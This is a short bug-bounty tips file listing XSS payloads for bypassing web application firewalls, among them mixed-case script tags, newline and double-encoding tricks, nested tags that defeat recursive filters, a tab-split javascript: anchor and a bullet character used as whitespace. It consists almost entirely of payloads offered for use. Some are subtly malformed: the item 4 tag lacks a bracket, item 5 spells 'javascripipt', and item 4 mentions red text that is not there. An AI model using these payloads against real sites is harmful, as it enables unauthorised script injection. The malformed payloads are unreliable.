# Bug Bounty Tips File -2
## XSS Firewall Bypass Techniques
1. Check if firewall is blocking only lowercases
```js
<sCRipT>alert(1)</sCRiPt>
```
2. Try to break firewall regex with new line (\r\n)
```js
<script>%0aalert(1)</script>
```
3. Try double encoding
`%2522`
4. Testing for recursive filters, if firewall removes text in red, we will have clear payload
```js
<scr<script>ipt<alert(1);</scr<script>ipt>
```
5. Injecting anchor tag without whitespaces
```js
<a/href="j&Tab;a&Tab;v&Tab;asc&Tab;ri&Tab;pi&Tab;pt&Tab;alert&lpar;1&rpar;">
```
6. Try to Bypass whitespaces using Bullet
```js
<svg•onload=alert(1)>
```
7. Try to chnage the Request Method
```js
GET /?a=xss

POST /?a=xss
```
